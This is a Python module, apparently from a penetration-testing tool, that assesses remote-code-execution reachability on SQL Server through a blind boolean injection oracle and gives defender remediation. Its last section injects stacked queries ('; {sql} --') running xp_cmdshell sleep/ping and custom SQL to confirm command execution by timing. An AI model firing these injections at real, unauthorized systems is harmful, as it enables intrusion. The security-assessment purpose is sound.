"""RCE reachability assessment for SQL Server over a boolean oracle.

On an authorized engagement the useful question is rarely "can I run a command"
but "which OS-command / code-execution avenues are *reachable* from here, and
what privilege do I hold?". Every fact that answers it is a yes/no question the
existing boolean oracle can settle:

  * privilege context (sysadmin? CONTROL SERVER? securityadmin/impersonate?),
  * whether each execution primitive is *enabled* and *present*
    (xp_cmdshell, OLE Automation, CLR, external scripts, SQL Agent),
  * lateral avenues (linked servers with RPC-out),
  * auxiliary primitives useful for coercion / file read (xp_dirtree,
    xp_fileexist, xp_regread).

This module only **detects and reports** that surface, with remediation for a
defender. It runs no commands and builds no payloads: over a blind boolean
channel the output is a true/false per configuration fact, which is exactly an
attack-surface assessment, not exploitation. Findings still come from the
oracle, so an ``UNKNOWN`` (ambiguous or permission-denied) is reported as such
rather than assumed safe.

Scope: SQL Server (MSSQL). Other engines expose different primitives.
"""

from __future__ import annotations

import enum
import statistics
import time
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional

from .result_types import OracleResult


class Status(enum.Enum):
    PRESENT = "PRESENT"    # the oracle confirmed the condition (reachable/true)
    ABSENT = "ABSENT"      # the oracle denied it (not reachable/false)
    UNKNOWN = "UNKNOWN"    # ambiguous or permission-denied; treat with caution


@dataclass(frozen=True)
class RceCheck:
    key: str
    title: str
    category: str      # privilege | exec-primitive | lateral | auxiliary
    severity: str      # info | low | medium | high | critical
    condition: str     # a boolean SQL expression (MSSQL) the oracle can settle
    present_means: str
    remediation: str


def _config_on(name: str) -> str:
    """A NULL-safe boolean: the given sp_configure option is in use (=1).

    EXISTS keeps a missing option (older SQL Server) reading as a clean FALSE
    rather than NULL, so it never gets mistaken for 'enabled'.
    """
    return f"EXISTS(SELECT 1 FROM sys.configurations WHERE name='{name}' AND value_in_use=1)"


def _server_perm(name: str) -> str:
    """Current login holds a server-level permission (read-only self-check)."""
    return ("(SELECT COUNT(*) FROM sys.fn_my_permissions(NULL,'SERVER') "
            f"WHERE permission_name='{name}') > 0")


# All conditions are COUNT/EXISTS/OBJECT_ID-wrapped so a missing row or a denied
# view reads as a clean FALSE rather than NULL. They are read-only catalog /
# permission queries; none of them changes server state.
MSSQL_CHECKS: List[RceCheck] = [
    # ---- privilege context ------------------------------------------------
    RceCheck(
        "sysadmin", "Current login is in the sysadmin server role", "privilege",
        "critical", "IS_SRVROLEMEMBER('sysadmin') = 1",
        "sysadmin can enable and use every execution primitive below.",
        "Run the app under a least-privilege login; never sysadmin."),
    RceCheck(
        "control_server", "Current login has CONTROL SERVER", "privilege",
        "critical", _server_perm("CONTROL SERVER"),
        "CONTROL SERVER is sysadmin-equivalent for configuration purposes.",
        "Revoke CONTROL SERVER from application logins."),
    RceCheck(
        "securityadmin", "Current login is in securityadmin", "privilege",
        "high", "IS_SRVROLEMEMBER('securityadmin') = 1",
        "securityadmin can grant itself further rights (privilege escalation).",
        "Remove application logins from securityadmin."),
    RceCheck(
        "impersonate_any", "Login can IMPERSONATE ANY LOGIN", "privilege",
        "high", _server_perm("IMPERSONATE ANY LOGIN"),
        "Allows impersonating sa / a sysadmin to reach the primitives below.",
        "Revoke IMPERSONATE ANY LOGIN."),
    RceCheck(
        "alter_settings", "Login has ALTER SETTINGS", "privilege",
        "high", _server_perm("ALTER SETTINGS"),
        "ALTER SETTINGS lets a non-sysadmin run sp_configure to flip primitives on.",
        "Revoke ALTER SETTINGS from application logins."),
    RceCheck(
        "db_owner", "Current principal is db_owner in the current DB", "privilege",
        "medium", "IS_MEMBER('db_owner') = 1",
        "db_owner enables TRUSTWORTHY/CLR and stored-procedure abuse paths.",
        "Avoid db_owner for application principals."),

    # ---- execution primitives --------------------------------------------
    RceCheck(
        "xp_cmdshell_enabled", "xp_cmdshell is enabled", "exec-primitive",
        "critical", _config_on("xp_cmdshell"),
        "Direct OS command execution is switched on.",
        "Disable xp_cmdshell (sp_configure 'xp_cmdshell',0) and keep advanced "
        "options off."),
    RceCheck(
        "xp_cmdshell_present", "xp_cmdshell proc exists", "exec-primitive",
        "info", "OBJECT_ID('sys.xp_cmdshell') IS NOT NULL",
        "The proc is installed (it can be re-enabled by a sysadmin).",
        "Presence is normal; control it via privilege and the enabled flag."),
    RceCheck(
        "advanced_options", "'show advanced options' is enabled", "exec-primitive",
        "low", _config_on("show advanced options"),
        "Advanced options (incl. xp_cmdshell) are togglable in-session.",
        "Leave 'show advanced options' at 0 outside maintenance."),
    RceCheck(
        "ole_automation", "OLE Automation Procedures enabled", "exec-primitive",
        "high", _config_on("Ole Automation Procedures"),
        "sp_OACreate/sp_OAMethod can spawn objects and run code.",
        "Disable 'Ole Automation Procedures'."),
    RceCheck(
        "clr_enabled", "CLR integration enabled", "exec-primitive",
        "high", _config_on("clr enabled"),
        "A custom CLR assembly can run arbitrary .NET (and shell out).",
        "Disable 'clr enabled' unless a signed assembly genuinely needs it."),
    RceCheck(
        "clr_strict_off", "'clr strict security' is OFF", "exec-primitive",
        "medium",
        "EXISTS(SELECT 1 FROM sys.configurations "
        "WHERE name='clr strict security' AND value_in_use=0)",
        "With CLR enabled, unsigned/UNSAFE assemblies can be loaded (easy RCE).",
        "Keep 'clr strict security' at 1 (default since SQL Server 2017)."),
    RceCheck(
        "external_scripts", "External scripts (R/Python) enabled", "exec-primitive",
        "high", _config_on("external scripts enabled"),
        "sp_execute_external_script runs R/Python, i.e. arbitrary code.",
        "Disable 'external scripts enabled' if ML Services is not required."),
    RceCheck(
        "agent_xps", "SQL Server Agent XPs enabled", "exec-primitive",
        "medium", _config_on("Agent XPs"),
        "SQL Agent jobs (CmdExec / PowerShell steps) are an OS-exec path.",
        "Disable 'Agent XPs' where the Agent is not needed."),

    # ---- lateral movement -------------------------------------------------
    RceCheck(
        "linked_rpcout", "A linked server has RPC OUT enabled", "lateral",
        "medium",
        "(SELECT COUNT(*) FROM sys.servers "
        "WHERE is_linked=1 AND is_rpc_out_enabled=1) > 0",
        "RPC-out linked servers allow EXEC ... AT to pivot / run procs remotely.",
        "Disable RPC OUT on linked servers that do not need it."),

    # ---- auxiliary primitives (coercion / file read) ---------------------
    RceCheck(
        "xp_dirtree_present", "xp_dirtree proc exists", "auxiliary",
        "low", "OBJECT_ID('sys.xp_dirtree') IS NOT NULL",
        "UNC paths via xp_dirtree can coerce NetNTLM auth for relay/capture.",
        "Restrict EXECUTE on xp_dirtree; block outbound SMB from the DB host."),
    RceCheck(
        "xp_fileexist_present", "xp_fileexist proc exists", "auxiliary",
        "low", "OBJECT_ID('sys.xp_fileexist') IS NOT NULL",
        "Filesystem probing and UNC coercion primitive.",
        "Restrict EXECUTE on xp_fileexist."),
    RceCheck(
        "xp_regread_present", "xp_regread proc exists", "auxiliary",
        "low", "OBJECT_ID('sys.xp_regread') IS NOT NULL",
        "Registry read primitive, useful for recon / credential locations.",
        "Restrict EXECUTE on xp_regread."),
]


@dataclass(frozen=True)
class Finding:
    check: RceCheck
    status: Status

    @property
    def key(self) -> str:
        return self.check.key

    @property
    def present(self) -> bool:
        return self.status is Status.PRESENT

    def to_dict(self) -> dict:
        return {
            "key": self.check.key,
            "title": self.check.title,
            "category": self.check.category,
            "severity": self.check.severity,
            "status": self.status.value,
            "present_means": self.check.present_means,
            "remediation": self.check.remediation,
        }


def assess(engine, checks: Optional[List[RceCheck]] = None,
           on_finding: Optional[Callable[[Finding], None]] = None) -> List[Finding]:
    """Settle each reachability question through the existing boolean oracle.

    Read-only: every condition is a catalog / permission query. Returns one
    Finding per check. Honours engine cancellation (Ctrl+C) between checks.
    """
    checks = checks if checks is not None else MSSQL_CHECKS
    engine.oracle.ensure_classifier()
    findings: List[Finding] = []
    for chk in checks:
        if engine.cancelled():
            break
        result = engine.oracle.ask(chk.condition).result
        if result is OracleResult.TRUE:
            status = Status.PRESENT
        elif result is OracleResult.FALSE:
            status = Status.ABSENT
        else:
            status = Status.UNKNOWN
        finding = Finding(chk, status)
        findings.append(finding)
        if on_finding is not None:
            on_finding(finding)
    return findings


def summarize(findings: List[Finding]) -> dict:
    """Derive an overall RCE-reachability verdict from the findings."""
    st: Dict[str, Status] = {f.key: f.status for f in findings}

    def present(key: str) -> bool:
        return st.get(key) is Status.PRESENT

    privileged = present("sysadmin") or present("control_server")
    can_toggle = privileged or present("alter_settings")

    direct = [k for k in ("xp_cmdshell_enabled", "ole_automation", "clr_enabled",
                          "external_scripts", "agent_xps") if present(k)]

    if present("xp_cmdshell_enabled"):
        verdict = "VULNERABLE"
        rationale = ("xp_cmdshell is enabled: OS command execution is directly "
                     "reachable" + (" and the login is sysadmin" if privileged else "") + ".")
    elif privileged and (present("xp_cmdshell_present") or present("advanced_options")):
        verdict = "VULNERABLE"
        rationale = ("The login is highly privileged and can enable xp_cmdshell / "
                     "OLE Automation / CLR at will, so RCE is reachable.")
    elif direct:
        verdict = "VULNERABLE"
        rationale = ("A code-execution primitive is enabled: "
                     + ", ".join(direct) + ".")
    elif can_toggle:
        verdict = "LIKELY"
        rationale = ("The login can flip sp_configure options (ALTER SETTINGS / "
                     "privileged role), so a primitive could be enabled.")
    elif any(f.status is Status.UNKNOWN for f in findings):
        verdict = "INCONCLUSIVE"
        rationale = ("Some checks were undecided (permission-denied or ambiguous); "
                     "treat RCE reachability as unconfirmed, not safe.")
    else:
        verdict = "NOT REACHABLE"
        rationale = ("No execution primitive is enabled and the login is not "
                     "privileged enough to enable one.")

    return {
        "verdict": verdict,
        "rationale": rationale,
        "privileged_login": privileged,
        "can_toggle_config": can_toggle,
        "enabled_primitives": direct,
    }


_STATUS_MARK = {Status.PRESENT: "[+]", Status.ABSENT: "[-]", Status.UNKNOWN: "[?]"}
_VERDICT_ORDER = ["VULNERABLE", "LIKELY", "INCONCLUSIVE", "NOT REACHABLE"]


def format_report(findings: List[Finding], summary: Optional[dict] = None) -> str:
    """A readable text report grouped by category, with the overall verdict."""
    summary = summary if summary is not None else summarize(findings)
    lines: List[str] = []
    lines.append("=" * 68)
    lines.append(f"MSSQL RCE reachability:  {summary['verdict']}")
    lines.append(summary["rationale"])
    lines.append("=" * 68)

    order = ["privilege", "exec-primitive", "lateral", "auxiliary"]
    titles = {
        "privilege": "Privilege context",
        "exec-primitive": "Execution primitives",
        "lateral": "Lateral movement",
        "auxiliary": "Auxiliary primitives (coercion / file / registry)",
    }
    by_cat: Dict[str, List[Finding]] = {}
    for f in findings:
        by_cat.setdefault(f.check.category, []).append(f)

    for cat in order:
        group = by_cat.get(cat)
        if not group:
            continue
        lines.append("")
        lines.append(titles.get(cat, cat) + ":")
        for f in group:
            mark = _STATUS_MARK[f.status]
            note = ""
            if f.status is Status.PRESENT:
                note = "  <- " + f.check.present_means
            elif f.status is Status.UNKNOWN:
                note = "  <- undecided; verify manually"
            lines.append(f"  {mark} {f.check.title} "
                         f"[{f.check.severity}]{note}")

    present = [f for f in findings if f.status is Status.PRESENT]
    if present:
        lines.append("")
        lines.append("Remediation for the confirmed exposures:")
        seen = set()
        for f in present:
            rem = f.check.remediation
            if rem in seen:
                continue
            seen.add(rem)
            lines.append(f"  - {rem}")
    lines.append("")
    return "\n".join(lines)


# ======================================================================
# Active execution verification (timing side channel)
# ======================================================================
#
# The assessment above is read-only: it reports which primitives are enabled.
# It cannot, on its own, prove that a command *actually runs* -- over a blind
# boolean channel the response body carries no command output. The honest way
# to obtain that proof is a timing side channel: make the primitive sleep for a
# chosen number of seconds and measure whether the HTTP response is delayed by
# that amount.
#
# Unlike the read-only checks, this DOES cause the server to execute something
# (a sleep), so it lives behind its own function / CLI subcommand rather than
# inside assess(). A WAITFOR control probe first proves the stacked-query timing
# channel works at all; a delay there is SQL execution, not OS execution. Only a
# delay through xp_cmdshell (or another OS primitive) proves OS command exec.


@dataclass(frozen=True)
class ExecProbe:
    key: str
    title: str
    platform: str          # "any" | "linux" | "windows"
    proves_os_exec: bool    # False for the WAITFOR control (SQL-only)
    sql_template: str       # a statement that sleeps; uses {secs} / {secs1}
    note: str

    def build_sql(self, secs: int) -> str:
        return self.sql_template.format(secs=secs, secs1=secs + 1)


# Each template sleeps for `secs` seconds when it executes. secs1 == secs+1 is
# for ping, which sends secs1 packets ~1s apart (so N+1 pings ~= N seconds).
MSSQL_EXEC_PROBES: List[ExecProbe] = [
    ExecProbe(
        "waitfor", "WAITFOR DELAY (stacked-query timing control)", "any", False,
        "WAITFOR DELAY '00:00:{secs:02d}'",
        "A delay proves stacked-query execution and that the timing channel "
        "works -- but NOT OS command execution."),
    ExecProbe(
        "xp_cmdshell_nix", "xp_cmdshell 'sleep' (Linux host)", "linux", True,
        "EXEC master..xp_cmdshell 'sleep {secs}'",
        "A delay proves xp_cmdshell ran an OS command on a Linux host."),
    ExecProbe(
        "xp_cmdshell_win", "xp_cmdshell 'ping' (Windows host)", "windows", True,
        "EXEC master..xp_cmdshell 'ping -n {secs1} 127.0.0.1'",
        "A delay proves xp_cmdshell ran an OS command on a Windows host."),
]
EXEC_PROBES_BY_KEY: Dict[str, ExecProbe] = {p.key: p for p in MSSQL_EXEC_PROBES}

# Default breakout: close the string literal, run a stacked statement, comment
# out the tail. Override for numeric / other contexts via --exec-payload.
DEFAULT_EXEC_PAYLOAD = "'; {sql} --"


class ExecVerdict(enum.Enum):
    CONFIRMED = "CONFIRMED"
    NOT_CONFIRMED = "NOT CONFIRMED"
    INCONCLUSIVE = "INCONCLUSIVE"


@dataclass
class ExecTrial:
    requested_delay: float
    elapsed: float
    timed_out: bool = False


@dataclass
class ExecCheckResult:
    probe_key: str
    probe_title: str
    verdict: ExecVerdict
    proves_os_exec: bool
    baseline_median: float
    threshold: float
    trials: List[ExecTrial]
    requests: int
    detail: str

    @property
    def confirmed(self) -> bool:
        return self.verdict is ExecVerdict.CONFIRMED

    def to_dict(self) -> dict:
        return {
            "probe": self.probe_key,
            "title": self.probe_title,
            "verdict": self.verdict.value,
            "proves_os_exec": self.proves_os_exec,
            "baseline_median_s": round(self.baseline_median, 3),
            "threshold_s": round(self.threshold, 3),
            "requests": self.requests,
            "trials": [
                {"requested_delay_s": t.requested_delay,
                 "elapsed_s": round(t.elapsed, 3),
                 "timed_out": t.timed_out}
                for t in self.trials
            ],
            "detail": self.detail,
        }


def verify_execution(
    engine,
    probe: ExecProbe,
    *,
    delay: float = 5.0,
    payload_template: str = DEFAULT_EXEC_PAYLOAD,
    baseline_samples: int = 3,
    trials: int = 2,
    confirm_fraction: float = 0.6,
    scale_check: bool = True,
    on_progress: Optional[Callable[[str], None]] = None,
) -> ExecCheckResult:
    """Actively confirm execution of *probe* through a timing side channel.

    Establishes a baseline latency, then sends the probe with a `delay`-second
    sleep `trials` times; a response slower than ``baseline + delay*fraction``
    is a hit. With ``scale_check`` a final trial at twice the delay guards
    against a coincidentally slow server -- the excess must grow with the delay.

    Returns an :class:`ExecCheckResult`. This issues requests that make the
    server sleep; it is the one active part of this module.
    """
    if delay <= 0:
        raise ValueError("delay must be positive")
    if "{sql}" not in payload_template:
        raise ValueError("payload_template must contain the {sql} placeholder")

    oracle = engine.oracle
    cfg = getattr(oracle, "config", None)

    # Make sure the HTTP client waits long enough to observe the delay, and do
    # not let request retries multiply a genuine timeout. Restore afterwards.
    saved = {}
    if cfg is not None:
        need = delay * (2 if scale_check else 1) + 10.0
        if getattr(cfg, "request_timeout", 0) < need:
            saved["request_timeout"] = cfg.request_timeout
            cfg.request_timeout = need
        if getattr(cfg, "max_retries", 1) > 1:
            saved["max_retries"] = cfg.max_retries
            cfg.max_retries = 1

    requests = 0

    def _time_send(injected: str) -> ExecTrial:
        nonlocal requests
        requests += 1
        t0 = time.time()
        resp = oracle.send_raw(injected)
        wall = time.time() - t0
        if resp is None:                       # timeout / transport failure
            return ExecTrial(0.0, wall, timed_out=True)
        return ExecTrial(0.0, resp.elapsed, timed_out=False)

    try:
        # -- baseline: the same primitive with a zero-second sleep -----------
        base_value = payload_template.format(sql=probe.build_sql(0))
        base_times: List[float] = []
        for _ in range(max(baseline_samples, 1)):
            if engine.cancelled():
                break
            t = _time_send(base_value)
            base_times.append(t.elapsed)
            if on_progress:
                on_progress(f"baseline {t.elapsed:.2f}s")
        baseline = statistics.median(base_times) if base_times else 0.0
        threshold = baseline + delay * confirm_fraction

        # -- delayed trials --------------------------------------------------
        d = int(round(delay))
        d_value = payload_template.format(sql=probe.build_sql(d))
        primary: List[ExecTrial] = []
        for _ in range(max(trials, 1)):
            if engine.cancelled():
                break
            t = _time_send(d_value)
            t.requested_delay = float(d)
            primary.append(t)
            if on_progress:
                on_progress(f"delay={d}s -> {t.elapsed:.2f}s"
                            + (" (timeout)" if t.timed_out else ""))

        all_trials = list(primary)

        # -- optional scaling trial at 2x the delay --------------------------
        scaled_ok: Optional[bool] = None
        if scale_check and primary and not engine.cancelled():
            d2 = d * 2
            t2 = _time_send(payload_template.format(sql=probe.build_sql(d2)))
            t2.requested_delay = float(d2)
            all_trials.append(t2)
            scaled_ok = t2.timed_out or (t2.elapsed - baseline) >= d2 * confirm_fraction
            if on_progress:
                on_progress(f"delay={d2}s -> {t2.elapsed:.2f}s"
                            + (" (timeout)" if t2.timed_out else ""))
    finally:
        if cfg is not None:
            for k, v in saved.items():
                setattr(cfg, k, v)

    # -- decision -----------------------------------------------------------
    def _hit(t: ExecTrial) -> bool:
        return t.timed_out or t.elapsed >= threshold

    verdict, detail = _decide_exec(
        probe, primary, all_trials, baseline, threshold, delay,
        scale_check, scaled_ok, cancelled=engine.cancelled(),
        base_ok=bool(base_times), hit=_hit)

    return ExecCheckResult(
        probe_key=probe.key, probe_title=probe.title, verdict=verdict,
        proves_os_exec=probe.proves_os_exec, baseline_median=baseline,
        threshold=threshold, trials=all_trials, requests=requests, detail=detail)


def _decide_exec(probe, primary, all_trials, baseline, threshold, delay,
                 scale_check, scaled_ok, *, cancelled, base_ok, hit):
    if not base_ok or not primary:
        return (ExecVerdict.INCONCLUSIVE,
                "Could not establish a baseline / run the trials"
                + (" (cancelled)." if cancelled else " (requests failed)."))

    hits = [t for t in primary if hit(t)]
    kind = "OS command execution" if probe.proves_os_exec else "stacked-query execution"

    if len(hits) == len(primary):
        if scale_check and scaled_ok is False:
            return (ExecVerdict.INCONCLUSIVE,
                    f"The {int(delay)}s trials were slow, but the delay did not "
                    "scale when doubled -- likely a slow/jittery server, not a "
                    "controlled delay. Re-run with a larger --exec-delay.")
        extra = "" if probe.proves_os_exec else (
            " Note: this is the WAITFOR control -- it proves the timing channel, "
            "not OS command execution.")
        return (ExecVerdict.CONFIRMED,
                f"Response latency tracked the injected delay, so {kind} is "
                f"confirmed. {probe.note}{extra}")

    if hits:
        return (ExecVerdict.INCONCLUSIVE,
                f"Only {len(hits)} of {len(primary)} delayed trials were slow "
                "enough; timing was inconsistent. Re-run with a larger "
                "--exec-delay or more --exec-trials.")

    return (ExecVerdict.NOT_CONFIRMED,
            f"No delay was observed, so {kind} via this probe is not confirmed. "
            "The primitive is likely disabled, absent, or the payload did not "
            "execute (wrong breakout for the injection context).")


def format_exec_report(results: List[ExecCheckResult]) -> str:
    """Readable multi-probe execution-verification report."""
    lines: List[str] = []
    lines.append("=" * 68)
    lines.append("MSSQL command-execution verification (timing side channel)")
    lines.append("=" * 68)
    mark = {ExecVerdict.CONFIRMED: "[+]",
            ExecVerdict.NOT_CONFIRMED: "[-]",
            ExecVerdict.INCONCLUSIVE: "[?]"}
    for r in results:
        lines.append("")
        lines.append(f"{mark[r.verdict]} {r.probe_title}: {r.verdict.value}")
        span = ", ".join(
            f"{int(t.requested_delay)}s->{t.elapsed:.2f}s"
            + ("(timeout)" if t.timed_out else "")
            for t in r.trials)
        lines.append(f"      baseline {r.baseline_median:.2f}s, "
                     f"threshold {r.threshold:.2f}s; trials: {span}")
        lines.append(f"      {r.detail}")
    lines.append("")
    return "\n".join(lines)


def resolve_exec_probes(names: Optional[List[str]] = None,
                        custom_sql: Optional[str] = None) -> List[ExecProbe]:
    """Pick probes for a run. ``custom_sql`` (with {secs}) builds a one-off probe;
    otherwise map names, or default to the control + both xp_cmdshell variants."""
    if custom_sql:
        if "{secs" not in custom_sql:
            raise ValueError("--exec-sql must contain the {secs} placeholder")
        return [ExecProbe("custom", "custom execution probe", "any", True,
                          custom_sql, "Custom operator-supplied delay statement.")]
    if not names or names == ["auto"]:
        return [EXEC_PROBES_BY_KEY["waitfor"],
                EXEC_PROBES_BY_KEY["xp_cmdshell_nix"],
                EXEC_PROBES_BY_KEY["xp_cmdshell_win"]]
    out: List[ExecProbe] = []
    for n in names:
        if n not in EXEC_PROBES_BY_KEY:
            raise ValueError(f"unknown exec probe {n!r}; choose from "
                             + ", ".join(EXEC_PROBES_BY_KEY))
        out.append(EXEC_PROBES_BY_KEY[n])
    return out
